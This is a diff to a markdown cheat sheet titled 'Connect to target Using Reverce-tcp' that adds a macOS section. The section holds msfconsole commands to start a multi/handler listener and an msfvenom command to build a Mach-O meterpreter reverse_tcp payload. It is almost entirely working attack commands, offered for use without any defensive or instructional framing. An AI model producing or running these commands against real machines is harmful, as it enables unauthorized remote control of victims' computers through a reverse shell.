@@ -1,4 +1,22 @@
 # Connect to target Using Reverce-tcp
+## MAC OS(OSX)
+
+https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/osx/x64/meterpreter/reverse_tcp.md
+
+listen
+```
+msfconsole
+use exploit/multi/handler
+set PAYLOAD osx/x64/meterpreter_reverse_tcp
+set LHOST [Your IP]
+run
+```
+
+create payload
+```
+msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=localhost LPORT=4444 -f macho -o /tmp/payload.bin
+```
+
 
 ## windows/android
 create payload
